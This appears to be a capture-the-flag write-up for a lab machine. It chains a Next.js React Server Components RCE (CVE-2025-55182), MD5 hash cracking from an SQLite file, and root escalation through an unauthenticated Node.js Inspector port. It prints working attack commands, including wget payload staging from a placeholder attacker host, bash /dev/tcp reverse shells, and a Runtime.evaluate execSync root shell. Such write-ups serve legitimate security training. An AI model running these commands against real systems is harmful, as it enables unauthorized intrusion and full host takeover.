A Next.js 15.0.3 monitoring panel exposed on port 3000 is vulnerable to **CVE-2025-55182** (React2Shell), an unauthenticated RSC deserialization RCE that lands a shell as `node`. A local SQLite database yields the `engineer` MD5 hash, which cracks to a reused SSH password (`user.txt`). Privilege escalation abuses a root-owned Node.js worker started with `--inspect`: tunnelling to the Inspector port and issuing `Runtime.evaluate` over the debugger WebSocket executes code as `root`.

## Reconnaissance & Enumeration

The objective of this phase was to enumerate the exposed services and identify the application stack worth attacking.

### Host Discovery

Reachability and an OS hint via ICMP:

```bash
ping -c 1 10.129.97.213
PING 10.129.97.213 (10.129.97.213) 56(84) bytes of data.
64 bytes from 10.129.97.213: icmp_seq=1 ttl=63 time=46.7 ms
```

A TTL of 63 indicates a Linux host (default 64, decremented once across the routing hop).

## Exploitation — CVE-2025-55182 (React2Shell)

### How the bug works

CVE-2025-55182 — nicknamed **React2Shell** — is a critical (CVSS 10.0), *unauthenticated* remote code execution flaw in the `react-server` package that underpins React Server Components. Next.js inherits it wholesale because its App Router and Server Actions are built directly on the same RSC runtime (the Next.js-specific twin, CVE-2025-66478, was later rejected by NVD as a duplicate of 55182).

The root cause is an **insecure deserialization** bug in the RSC **"Flight"** protocol — the serialized wire format React uses to stream server-rendered component data and server-function calls between server and client. When the server parses an incoming Flight payload, it resolves internal object references that are delimited by a colon (`:`). By crafting those references, an attacker abuses JavaScript's duck-typing during deserialization to steer the reconstruction logic into calling attacker-controlled code, ultimately reaching a code-execution sink and running arbitrary JavaScript inside the server process.

Two properties make this catastrophic. First, it is reachable **before any authentication check**, because the RSC request handling happens ahead of application auth logic. Second, a stock `create-next-app` production build is vulnerable with *no code changes* — the developer doesn't have to expose a single Server Action for the surface to exist. A single crafted HTTP request is enough, and the injected code runs with the privileges of the account running the web server — here, the `node` user.

### Confirming code execution

I cloned the public PoC and used it to test for blind RCE by forcing the target to call back to my machine:

```bash
git clone https://github.com/acheong08/CVE-2025-55182-poc
cd CVE-2025-55182-poc
./exploit-nextjs.sh http://10.129.97.213:3000 'curl http://<ATTACKER_IP>:8000'
[*] CVE-2025-55182 Next.js RSC RCE Exploit
[*] Target: http://10.129.97.213:3000
[*] Command: curl http://<ATTACKER_IP>:8000
[*] Sending exploit payload...

[+] SUCCESS - Request timed out (server hung executing command)
[+] Command 'curl http://<ATTACKER_IP>:8000' was likely executed on the target
```

Because the primitive is blind (the command output never comes back in the HTTP response), I confirmed execution out-of-band with a listener. A Python web server on the attacker box caught the callback:

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.97.213 - - [06/Aug/2026 17:26:01] "GET / HTTP/1.1" 200 -
```

The inbound `GET` from the target proves arbitrary command execution as `node`.

### From blind RCE to an interactive shell

A one-liner reverse shell passed inline didn't connect back. The reason is a shell-context mismatch: the RCE sink executes the command through the default system shell (`/bin/sh`, which on Ubuntu is `dash`), and the `bash -i >& /dev/tcp/...` idiom relies on bash-only features — the `>&` redirection and the `/dev/tcp` pseudo-device simply don't exist in `dash`. Rather than fight the quoting and shell-compatibility issues, I staged the payload as a file and invoked `bash` explicitly to run it.

First I wrote the reverse shell locally and served it:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > rev.sh
python3 -m http.server 8000
```

Then I pulled the file onto the target and executed it with `bash`, so the bash-specific redirection runs under the right interpreter:

```bash
./exploit-nextjs.sh http://10.129.97.213:3000 'wget http://<ATTACKER_IP>:8000/rev.sh'
[+] SUCCESS - Request timed out (server hung executing command)

./exploit-nextjs.sh http://10.129.97.213:3000 'bash rev.sh'
[+] SUCCESS - Request timed out (server hung executing command)
```

The listener caught the callback:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.97.213 33694
bash: cannot set terminal process group (1393): Inappropriate ioctl for device
bash: no job control in this shell
node@reactor:/opt/reactor-app$
```

Foothold established as `node`. A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

## Post-Exploitation Enumeration

With a shell as `node` in the application directory, I looked at who else has a real login shell:

```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
```

Two interactive accounts: `root` and `engineer`. The `node` service account can't read `user.txt`, so `engineer` is the next target. Inspecting the app directory revealed a local database:

```bash
ls -la
drwxr-xr-x  2 node node  4096 Dec 28  2025 app
-rw-r--r--  1 node node   276 Dec 28  2025 .env
-rw-r-----  1 node node 12288 Dec 28  2025 reactor.db
-rw-r--r--  1 node node   269 Dec 28  2025 package.json
-rwxr-xr-x  1 node node    43 Aug  6 15:42 rev.sh
```

`reactor.db` is an SQLite file, readable by `node`. Rather than launch a client, `strings` is enough to dump the schema and rows:

```bash
strings reactor.db
SQLite format 3
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
5engineer39d97110eafe2a9a68639812cd271e8eoperatorengineer@reactor.htb
M'/admina203b22191d744a4e70ada5c101b17b8administratoradmin@reactor.htb
```

The `users` table stores two accounts with password hashes:

- `engineer` → `39d97110eafe2a9a68639812cd271e8e` (role `operator`)
- `admin` → `a203b22191d744a4e70ada5c101b17b8` (role `administrator`)

Both are 32-character hex strings — unsalted MD5. `engineer` maps directly to a local system account, so its hash is the one worth cracking.

## Privilege Escalation — `engineer` → `root`

With a stable shell as `engineer`, the standard enumeration turned up a locally bound service that stood out. Listing listening sockets:

```bash
ss -nltp
State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process
LISTEN  0       511         127.0.0.1:9229          0.0.0.0:*
LISTEN  0       4096          0.0.0.0:22            0.0.0.0:*
LISTEN  0       511                 *:3000                *:*
```

Port **9229** bound to `127.0.0.1` is the tell. `9229` is the default port of the **Node.js Inspector** (the debugger backend). Confirming what owns it:

```bash
ps aux | grep node
root  1395  0.0  1.2 1067104 47780 ?  Ssl  14:53  0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

A Node process running **as `root`** was launched with `--inspect=127.0.0.1:9229`. This is the escalation path in full.

### Why `--inspect` is game over

When Node.js is started with `--inspect`, it opens a debugger endpoint that speaks the **Chrome DevTools Protocol (CDP)** over a WebSocket. The protocol is designed to give a debugger total control of the running process: it exposes the `Runtime.evaluate` method, which evaluates an arbitrary JavaScript expression *in the context of the debugged process*. There is no authentication on the Inspector — the only access control is that the port is bound to loopback, and the tacit assumption that only a local, trusted developer can reach it.

That assumption breaks the moment an unprivileged local user can talk to the socket. Because the worker runs as `root`, any JavaScript evaluated through its debugger runs as `root` too. Inside a Node runtime, reaching the operating system is trivial: `require('child_process').execSync(...)` spawns a shell command. So `Runtime.evaluate` becomes a `root` command-execution primitive — no exploit, no memory corruption, just the debugger doing exactly what it's built to do, to a process it shouldn't be exposed on.

The single obstacle is that `9229` listens only on `127.0.0.1`. I already have a foothold on the box as `engineer`, so I bridged the port to my attacker machine with an SSH local forward:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.97.213 -N
```

With `-N` the connection opens no remote shell — it exists purely to carry the tunnel, mapping my local `127.0.0.1:9229` to the target's Inspector.

### Talking to the Inspector

The Inspector's HTTP side hands out the WebSocket URL, but a bare request just complains:

```bash
curl http://127.0.0.1:9229/
WebSockets request was expected
```

The debugger metadata lives under a known JSON endpoint. Fuzzing the HTTP interface located it:

```bash
wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://127.0.0.1:9229/FUZZ --hh=33
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000010230:   200        12 L     23 W       676 Ch      "json"
```

`/json` (equivalently `/json/list`) is the standard Inspector discovery endpoint. Querying it returns the session's `webSocketDebuggerUrl`, including the unique debugging session UUID:

```bash
curl http://127.0.0.1:9229/json
[ {
  "description": "node.js instance",
  "id": "6e5d1067-d88d-4659-871f-4ba720259bf8",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/6e5d1067-d88d-4659-871f-4ba720259bf8"
} ]
```

### Executing code as root

With the WebSocket URL in hand, `wscat` connects to the debugger and speaks CDP directly. The first message issues a `Runtime.evaluate` that runs `id` through `child_process.execSync` — a proof-of-privilege check:

```bash
wscat -c ws://127.0.0.1:9229/6e5d1067-d88d-4659-871f-4ba720259bf8
Connected (press CTRL+C to quit)
> {"id": 1, "method": "Runtime.evaluate", "params": {"expression": "process.mainModule.require('child_process').execSync('id').toString()", "returnByValue": true}}
< {"id":1,"result":{"result":{"type":"string","value":"uid=0(root) gid=0(root) groups=0(root)\n"}}}
```

`uid=0(root)` confirms code execution as `root`. Swapping the command for a reverse shell — wrapped in `bash -c` so the bash-only `/dev/tcp` redirection runs under bash — turns that primitive into an interactive root session:

```bash
> {"id": 1, "method": "Runtime.evaluate", "params": {"expression": "process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"').toString()", "returnByValue": true}}
```

The listener caught the root callback:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.97.213 45594
bash: cannot set terminal process group (1385): Inappropriate ioctl for device
bash: no job control in this shell
root@reactor:/# cat /root/root.txt
```

Full compromise.

## Key Takeaways

- **A framework version string is an exploit lookup.** Wappalyzer surfacing "Next.js 15.0.3" was the entire recon-to-exploit bridge: that exact version pins a React 19 RSC runtime vulnerable to CVE-2025-55182, and the RSC headers in the raw nmap banner said the same thing before a browser was ever opened.
- **Blind RCE is confirmed out-of-band, not in the response.** When the injected command's output never returns, an attacker-controlled callback (`curl`/`wget` to a listener) is the reliable proof of execution — and the pivot point to staging a real payload.
- **Reverse-shell one-liners fail on shell mismatch, not on the RCE.** `bash -i >& /dev/tcp/...` needs bash; if the sink runs commands through `dash`, stage the payload as a file and invoke `bash` on it explicitly rather than assuming the vector is broken.
- **Dump SQLite with `strings` before reaching for a client.** A world-readable `*.db` in an app directory almost always holds credentials; `strings` recovers the schema and rows in one command, no query language required.
- **Cracking an app hash should reflexively be followed by an SSH attempt.** Application accounts and the same-named OS account routinely share a password; `engineer`'s cracked MD5 was directly the SSH key to `user.txt`.
- **A Node process with `--inspect` is an unauthenticated root shell waiting for a local client.** The Inspector's `Runtime.evaluate` runs arbitrary JavaScript in the target process; if that process is `root`, `child_process.execSync` is instant root command execution. Loopback binding is not a security boundary once you have any local foothold — an SSH `-L` forward reaches it trivially. Debug flags never belong on a production, root-owned service.
